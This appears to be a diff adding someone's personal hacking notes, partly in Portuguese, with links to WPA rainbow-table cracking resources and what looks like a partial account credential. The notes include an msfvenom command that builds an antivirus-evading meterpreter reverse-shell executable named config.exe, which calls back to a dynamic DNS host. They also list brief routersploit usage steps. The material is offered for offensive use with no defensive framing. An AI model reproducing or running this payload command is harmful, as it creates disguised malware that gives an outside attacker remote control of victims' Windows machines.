@@ -1,0 +1,30 @@
+www.thecrackertechnology.com/2016/01/04/rainbow-tables-wpa-wpa2/
+
+
+rainbowcrack link: http://project-rainbowcrack.com/
+
+
+
+http://project-rainbowcrack.com/table.htm
+
+http://academiadaguitarra.com.br/ebook-dbg-vsl
+
+mediafire _c.almeida CK#*,
+
+-------------------------------------------------------------------------------------------
+
+Payload for windows.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=sechost.ddns.net LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 > config.exe
+
+assinar...
+
+rsf
+
+show all
+
+use ...
+set target ...
+run enter
+
+repete modificando modulos... feh
